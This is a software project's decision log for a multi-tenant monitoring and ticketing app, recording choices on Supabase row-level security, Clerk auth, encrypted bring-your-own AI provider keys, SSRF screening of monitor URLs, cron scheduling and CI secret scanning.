`chat_messages` ride that visibility (`conversation_id in (select id from
chat_conversations)`), so there is one rule, not two copies. Proven in
`tests/isolation/chat-isolation.test.ts`: admin of A reads member conversations,
member One cannot read member Two's, org B reads nothing, both claim shapes.

**Affects.** Any future analytics or reporting over conversations inherits admin
visibility. If a genuinely private support channel is ever wanted, it is a new
surface with its own policy, not a change to this one. The disclosure line is
load bearing for the honesty of the model and must not be removed.

---

## 2026-07-24 — BYOK only for MVP; keys encrypted at the application layer, ciphertext never leaves the server

**Decided.** AI support chat is bring your own key only for the MVP. Each org
adds its own provider key (Anthropic, OpenAI, or Google); there is no managed
Talvex key serving customers and no managed tier. An org with no key sees a
calm explainer and only the ticket path in Get help. The managed tier arrives
later with usage metering (BRD F11), not now.

**Why.** Managed AI means Talvex pays for inference and must meter and bill it;
that is a whole billing surface (BRD F13) not in Phase 1. BYOK removes the
margin risk entirely and is the product's differentiator (BRD section 7). Cheap
default models per provider are hardcoded this task (`claude-haiku-4-5`,
`gpt-4o-mini`, `gemini-2.0-flash-lite`); per org model choice is future work.

**How the key is protected (the design a reviewer can check against the code).**
The plaintext key is encrypted with AES 256 GCM in `src/lib/chat/encryption.ts`
BEFORE it reaches Postgres, using `API_KEY_ENCRYPTION_SECRET` (32 bytes, server
env only, documented by name in `.env.example`, never in the repo or database).
The `org_api_keys` table stores ciphertext, provider, and the last four
plaintext characters for display. The `encrypted_key` column is withheld from
the authenticated SELECT grant, so no user session, not even an admin's, can
read the ciphertext through RLS; only the service role can, and it decrypts in
request scope at the moment of a provider call, never caching or storing the
plaintext. Key management is admin only at the database (`is_org_admin()`, the
column not the claim), and every action writes an append only trail via a
trigger, the `ticket_events` pattern. Nothing key shaped is ever logged: not
the key, ciphertext, headers, or request/response bodies, and provider errors
scrub to a status based remediation. GCM is authenticated, so a tampered
ciphertext fails rather than decrypting to garbage.

**Affects.** Rotating `API_KEY_ENCRYPTION_SECRET` invalidates every stored key
(they must be re added); a future rotation scheme would re encrypt under a new
secret, which the `v1.` format prefix leaves room for. The managed tier, when
it lands, adds a platform key path and metering but does not change this
vault. Anything that ever needs to read a provider key must go through the
service role, `src/lib/chat/key-vault.ts`, never a user session. Proven in
`tests/isolation/api-key-isolation.test.ts` and `tests/encryption.test.ts`.

## 2026-07-23 — Member linking is allowed at the database; the Create ticket button is admin only in the UI only

**Decided.** The incident to ticket bridge (Phase 1 Task 4) adds a nullable
`tickets.incident_id`. On the question the ruling left open, whether a
non admin member may create a ticket carrying an incident_id for their own
org, the answer is **allow**. The insert with check permits any member to
link, as long as the incident belongs to the same organization; it does not
gate linking on `org_members.role`. The Create ticket button on incident
detail is admin only, but that is a UI affordance, not a database boundary.

**Why.** The link is harmless same org metadata. A member already sees every
incident in their org (migration 004: incident visibility is org wide), so a
ticket that references one they can already see reveals nothing new and
grants no capability. The ticket insert policy is deliberately role agnostic
("any member creates tickets in their own org, as themselves"); adding an
admin gate only on the incident_id branch would thread role logic into the
creation path for no security gain. The boundary that actually matters,
cross org linkage, is enforced regardless of role and is the one new attack
surface this task introduces.

**How it is encoded.** The with check gains one clause:
`incident_id is null or incident_id in (select id from public.incidents)`.
That subquery runs under the caller's own RLS, so it is exactly the incidents
this session may see, which for org wide incident visibility is exactly the
incidents in the active org. The ticket's own `org_id` is already pinned to
the active org by the existing clause, so a passing incident is provably in
the same org as its ticket. This mirrors the ticket_comments "on a ticket you
can see" pattern rather than inventing a second mechanism. `incident_id` is
in the insert column grant but NOT the update grant, so the link is fixed at
birth and no one, admin included, can rewrite it.

**Affects.** Org B cannot mint a ticket pointing at org A's incident: A's
incident is not in B's visible set, so the with check fails. A member of A
also cannot link to an incident they cannot see. Both are proven in
`tests/isolation/incident-ticket-link-isolation.test.ts` under both claim
shapes, alongside the allow decision (a plain member seeds the linked ticket
through their own RLS session) and the immutability of the link. If incident
visibility ever narrows below org wide (per member scoping), revisit this
clause: "visible to you" would stop meaning "in your org", and the link
integrity rule wants the latter. No status coupling exists in either
direction; the reference cards read the other side's current status live and
nothing writes across the boundary.

---

## 2026-07-23 — Monitor checks sweep daily on Vercel Hobby; per monitor intervals are aspirational until Pro

**Decided.** Monitor checks run as one cron sweep: a single Vercel Cron
schedule invokes `/api/cron/check-monitors`, which checks every active
monitor whose own interval has elapsed. On the Hobby plan the schedule is
`0 6 * * *`, because Hobby hard caps cron at once per day (finer expressions
fail deployment, and timing is only per hour precise, so 06:00 fires
anywhere in 06:00 to 06:59 UTC).

**Why.** The Phase 1 Task 1 ruling accepted free tier granularity outright.
The sweep is granularity agnostic: it reads each monitor's
`interval_seconds` and checks what is due, so the code is already correct
for any schedule. Only the schedule line embodies the cap.

**Affects.** Until the project moves to Vercel Pro, every monitor is
checked at most once a day regardless of its configured interval, uptime
percentages are computed from one or two checks per day, and "response
time" is a daily sample. The incidents task (next) must not assume fresh
checks exist. Upgrading is a one line edit to `vercel.json` plus nothing
else. The route requires the `CRON_SECRET` bearer token and fails closed
when the variable is unset, so a new environment that forgets the variable
gets a silent cron 401, not an open endpoint; the variable is documented in
`.env.example` and must be set in Vercel by hand.

---

## 2026-07-23 — Migrations carry explicit GRANTs from 003 onward

**Decided.** Migration 003 is the first to state table and function grants
explicitly: revoke everything from `anon` and `authenticated` first, then
grant back exactly the verbs each role needs. Every future migration that
creates a table or function does the same. The pattern for cron written
tables: `authenticated` gets select only (RLS filters rows on top),
`service_role` gets all, `anon` gets nothing.

**Why.** Both the local stack's `auto_expose_new_tables` and the remote
project's automatic privileges for API roles are deprecated behavior with a
removal date (2026-10-30, tracked in supabase/config.toml). Tables relying
on auto exposure stop being reachable when that lands. Explicit grants also
say what each role can do where the reviewer is already reading policies.

**Affects.** Tables from migrations 001 and 002 (`organizations`,
`org_members`) still lean on auto exposure; they need a grants backfill
migration before the config flag can be removed, and that flag must stay
until then. Grant checks are also verb level security the isolation suite
exercises: the monitor suite asserts a member session cannot insert into
`monitor_checks` at all, which is the grants and the absent policy working
together.

---

## 2026-07-23 — SSRF screening runs at check time; DNS rebinding is an accepted residual

**Decided.** Monitor URLs get two validation layers. At save time, the data
layer accepts only http/https with no embedded credentials (syntax only).
At check time, before every request including every redirect hop, the cron
path resolves the hostname and refuses any target in private or internal
address space: localhost names, RFC 1918, loopback, link local, CGNAT
100.64/10, 0/8, and the IPv6 equivalents (::1, ::, fc00::/7, fe80::/10,
fec0::/10, IPv4 mapped forms). The decision table lives in
`src/lib/db/monitor-url.ts` and is pinned by `tests/monitor-url.test.ts`.

**Why.** Checks fetch user supplied URLs from our infrastructure, so a URL
resolving to internal space would let a tenant probe our network (the cloud
metadata address 169.254.169.254 being the classic target). The screen runs
at check time, not save time, because DNS answers change after save;
save time screening would be a time of check / time of use hole.

**Affects.** One residual risk is accepted and documented in
`src/lib/monitoring/check.ts`: the guard resolves the name and fetch then
resolves it again, so an attacker flipping DNS between the two lookups
(rebinding) could still reach an internal address. Closing it fully means
pinning the connection to the vetted IP, which conflicts with TLS SNI and
Host handling; revisit in Phase 2 with the other check hardening (keywords,
certs, regions). Anything else that ever fetches user supplied URLs (status
page logos, webhook targets, integrations) must reuse this same screen.

---

## 2026-07-23 — One Supabase project backs every environment, until the first customer

**Decided.** A single Supabase project (ref `rdfuzadtraxzrrthhnnp`) backs local
development, Vercel preview, and production. The isolation suite is the only
exception: it runs against an ephemeral local stack (see the 2026-07-22 entry
below) and never touches this project.

**Why.** Separate projects per environment cost setup and a second set of
secrets for a build with no users yet. The boundary that matters is between
organizations, and RLS enforces that inside one project regardless of
environment.

**Affects.** Anything written through the deployed Clerk webhook lands in the
same rows the local app reads. Task 7 proved this live: creating a temp org on
the dev Clerk instance inserted real rows, because the webhook endpoint points
at the Vercel URL, and deleting the org removed them again. Accepted until the
first real customer; production moves to its own project before anyone else's
data lives here.

---

## 2026-07-23 — Clerk's generated org avatar is left as rendered

**Decided.** The violet gradient identity avatar Clerk generates for
organizations without a logo is not restyled. It is the one element on the
select org and dashboard screens sitting outside the palette.

**Why.** It is identity content, not chrome: a real uploaded org logo replaces
it. Forcing it into the palette would also desaturate genuine customer logos
once those exist, which is worse than one placeholder tile. It breaks no rule;
violet is not a status color (green, amber, and red stay reserved for status
meaning).

**Affects.** Org logo upload in a later phase resolves this on its own. Until
then, reviewers see a violet tile by design, not by oversight.

---

## 2026-07-23 — Landing page stays at the end of the MVP, reaffirmed

**Decided.** The public marketing landing page is built last, after Phase 1
features exist, exactly where docs/PHASE_0_PLAN.md and the BRD place it. A
queued agent task to build it early (7b) was cancelled and its tracking note
deleted.

**Why.** A landing page written before the product it advertises exists would
invent screens, metrics, and claims the features then have to catch up to. The
Task 7 design system is the reusable material it will be assembled from when
the time comes; nothing is lost by waiting.

**Affects.** Phase 0 ends with PR #7. The root route stays the plain
placeholder. Phase 1 (monitors, tickets, chat) is the next work and starts on
an explicit kickoff, not by drifting into it.

---

## 2026-07-22 — Phase 0 ships on a Clerk development instance, and what that costs

**Decided.** The Phase 0 production deploy runs at
`https://talvex-chi.vercel.app` on Clerk **development** keys (`pk_test_`). No
domain was purchased. The plain `talvex.vercel.app` subdomain is taken by
another account and returns 451, so Vercel's auto assigned
`talvex-chi.vercel.app` is the "nearest available" name Task 6 allows.

**Why.** A Clerk production instance requires DNS records (`clerk.<domain>`,
`accounts.<domain>`, and email records) on a domain you control. Those records
cannot be added to a `*.vercel.app` subdomain because Vercel owns that zone. So
"production deploy on the free vercel.app subdomain" and "Clerk production
instance" are mutually exclusive; one of them had to give. BRD section 9.1
budgets the domain at roughly 12 dollars a year and defers it until there is a
reason to look professional to a paying stranger, so the domain gave.

**What it actually costs, including one thing we did not anticipate.** The
known costs were a Clerk development banner, a Google consent screen showing an
`accounts.dev` domain, and a development instance user cap. Verification of the
live deploy turned up a fourth, larger one: **protected routes return 404 to
signed out visitors instead of redirecting to sign in.** The response carries
`x-clerk-auth-reason: protect-rewrite, dev-browser-missing`. A development
instance establishes session context on a deployed domain through a dev browser
token; with no token present, `auth.protect()` rewrites to 404 rather than
redirecting. This contradicts the behaviour `src/proxy.ts` documents and that
the Task 3 test proves, both of which are correct on localhost and on a
production instance. A visitor entering through the home page and signing in is
unaffected, because the handshake sets the token; only a cold deep link to
`/dashboard` or `/select-org` hits it.

**Affects.** The live URL is usable as a demo but is not yet the portfolio
artifact BRD C5 wants, and the Phase 0 definition of done ("a stranger can
visit the live URL, sign in with Google, create an organization") holds only
for a stranger who starts at the home page. Upgrading is a self contained
sequence, not a rewrite: buy a domain, point it at the Vercel project, create a
Clerk production instance with our own Google OAuth credentials, re register the
new Clerk domain in Supabase third party auth (the third party auth entry
below), reissue the Clerk environment variables in Vercel, and recreate the
webhook endpoint against the new instance. The RLS claim pattern does not
change, so no migration is involved. Until then, do not read the deployed 404
as a routing bug; it is this decision showing through.

---

## 2026-07-22 — Isolation is proven against an ephemeral local Supabase stack with self minted JWTs

**Decided.** The tenant isolation suite (`tests/isolation/`) runs against a
local Supabase stack started by the pinned CLI (`supabase` in devDependencies,
exact version), both on developer machines and in CI. `supabase/config.toml`
starts only Postgres, Kong, PostgREST, and GoTrue; migrations apply from zero
on every start. GoTrue is never called by the tests, but disabling it also
removes the auth schema helpers (`auth.jwt()`) that every RLS policy reads,
so it runs. The tests mint their own HS256 JWTs with the CLI's fixed, published
local development secret, carrying the Clerk claim shapes from the entry
below, one token per shape. CI holds no cloud credentials of any kind. When
the stack is not running the suite fails loudly with the command that fixes
it; it never skips.

**Why.** RLS can only be proven by a real Postgres and a real PostgREST
evaluating the real policies under a real token; mocks would prove nothing.
The alternatives all put credentials somewhere: pointing CI at the real
project puts the RLS bypassing service role key in GitHub secrets and writes
test rows into the production bound database on every PR; a persistent cloud
test project still needs secrets, pauses after a week idle on the free tier
(silently bricking CI), and drifts. The local stack needs neither Clerk nor
Supabase accounts because the policies never talk to Clerk: they read claims
from whatever verified JWT arrives, so a token signed with the stack's own
secret and shaped like Clerk's exercises exactly the production code path.
Self minting also lets the suite test BOTH claim shapes of the coalesce,
which no single real Clerk token can do. Bonus: every PR now proves the
migrations replay cleanly from an empty database.

**Affects.** Every tenant table added after this gets its cases in
`tests/isolation/` against this stack (CLAUDE.md rules 2 and 8). Running the
full test suite now requires Docker plus `npm run db:start`; after a new
migration, `npm run db:reset`. CI's quality job boots the stack (a few
minutes of image pulls per run; image caching is a known future optimization,
weakening the test is not). The local dev JWT secret literal in
`tests/isolation/local-stack.ts` is intentionally committed with a gitleaks
allow marker: it is a published constant shared by every local Supabase stack
in the world, not a credential. If the local stack ever moves to asymmetric
signing keys, `TALVEX_TEST_SUPABASE_JWT_SECRET` is the escape hatch.

---

## 2026-07-21 — Every session carries an organization: hidePersonal on the switcher

**Decided.** The organization switcher in the dashboard header is rendered with
`hidePersonal`, so a user cannot select a personal workspace. Clerk's instance
config backs this up with `force_organization_selection` enabled. Every
authenticated session therefore has an active organization.

**Why.** Tenancy is not a UI preference here, it is the thing the database
relies on. Every RLS policy reads the organization claim from the Clerk token,
using the pattern in the entry below:

```sql
organization_id = (select coalesce(auth.jwt()->>'org_id', auth.jwt()->'o'->>'id'))
```

A personal workspace produces a session with no organization id. That claim
then resolves to null, the predicate matches nothing, and every query silently
returns zero rows. The failure looks like an empty dashboard rather than an
error, which is the worst kind: it is indistinguishable from a tenant that
genuinely has no data, so it would be diagnosed as a bug in whatever feature
happened to be on screen. Closing the hole at the session boundary means no
query is ever issued without a tenant to scope it to.

**Affects.** The data layer in `src/lib/db/` from Task 4 onward may treat an
active organization as a precondition rather than an optional value, but it
must not assume the invariant holds silently. `hidePersonal` is a UI control,
and UI controls are not a security boundary: it stops the switcher offering a
personal workspace, it does not stop a request arriving without an org. Task 4
still needs an explicit server side decision, redirect or hard error, for a
request whose token has no organization id. `src/app/dashboard/page.tsx`
currently surfaces the active `userId`, `orgId`, and `orgRole` so a session
missing its organization is visible immediately rather than at query time.

---

## 2026-07-21 — Clerk to Supabase auth path: third party auth, not JWT templates

**Decided.** Clerk is wired to Supabase as a third party auth provider. The
Clerk session token is passed directly as the Supabase access token, via the
`accessToken` option on the Supabase client. We do not create a Supabase JWT
template in Clerk, and we do not copy the Supabase JWT secret into Clerk.

**Why.** The older Clerk integration with Supabase, which used a configurable
JWT secret and a Clerk JWT template, was deprecated on 1 April 2025 and is no
longer recommended. Third party auth is the supported path.
Reference: https://supabase.com/docs/guides/auth/third-party/clerk

**The claim pattern every tenant policy uses.** Clerk puts the active
organization id in the token. Two claim shapes exist, the legacy `org_id` and
the v2 `o.id`, so policies must read both:

```sql
organization_id = (select coalesce(auth.jwt()->>'org_id', auth.jwt()->'o'->>'id'))
```

The role check follows the same dual shape:

```sql
((select auth.jwt()->>'org_role') = 'org:admin') or ((select auth.jwt()->'o'->>'rol') = 'admin')
```

The `coalesce` is not optional. Dropping it silently breaks isolation for
whichever claim shape is not handled.

**Affects.** Every RLS policy written from Task 4 onward, both tables in
migration 001 and every tenant table after them. Also the data layer in
`src/lib/db/`: queries must run through a request scoped client carrying the
user's Clerk token, because a client built with the service role key bypasses
RLS entirely. The service role client stays a separate, narrowly used export.

---

## 2026-07-21 — CI secret scan needs an explicit permissions block

**Decided.** The `secret-scan` job in `.github/workflows/ci.yml` declares its
own permissions, `contents: read` and `pull-requests: write`, and nothing more.

**Why.** The job failed in 8 seconds with HTTP 403, "Resource not accessible
by integration". GitHub now issues a read only workflow token by default, so
gitleaks could not list the pull request's commits or write findings back onto
the PR. The first suspected cause, that gitleaks-action requires a paid
license for organization owned repositories, was wrong: that limit is real for
org owned repos but was not what failed here, and this repo is owned by a
personal account. Diagnosing from the job log rather than the assumption is
what found it.

**Affects.** Any future workflow job that calls the GitHub API needs the same
treatment: grant the narrowest scopes on that job instead of loosening the
repository wide default. The `quality` job keeps the restrictive default.

---

## 2026-07-21 — .gitignore exception for .env.example, backed by a test

**Decided.** `.gitignore` keeps the `.env*` pattern from create-next-app and
adds `!.env.example` immediately after it.

**Why.** Task 1 requires a committed `.env.example` documenting every variable
name. The generated `.env*` pattern would have ignored that file silently, so
the template would never have reached the repository while appearing to be
present locally. Real env files stay ignored; only the placeholder template is
tracked.

**Guarded by a test, not by discipline.** `tests/env-hygiene.test.ts` asserts
the ignore rules hold, that every required variable is documented, that the
template carries only placeholder values, and that no `NEXT_PUBLIC_` name
contains `SECRET`, `SERVICE_ROLE`, or `PRIVATE`. It was verified as a real
guard: planting a realistically shaped `sk_test_` key in `.env.example` makes
it fail, and removing the key makes it pass. A test that cannot fail proves
nothing, so new hygiene rules added here get the same negative check.

**Affects.** Adding an environment variable now means updating `.env.example`
and the list in that test, or CI fails. This is intentional.
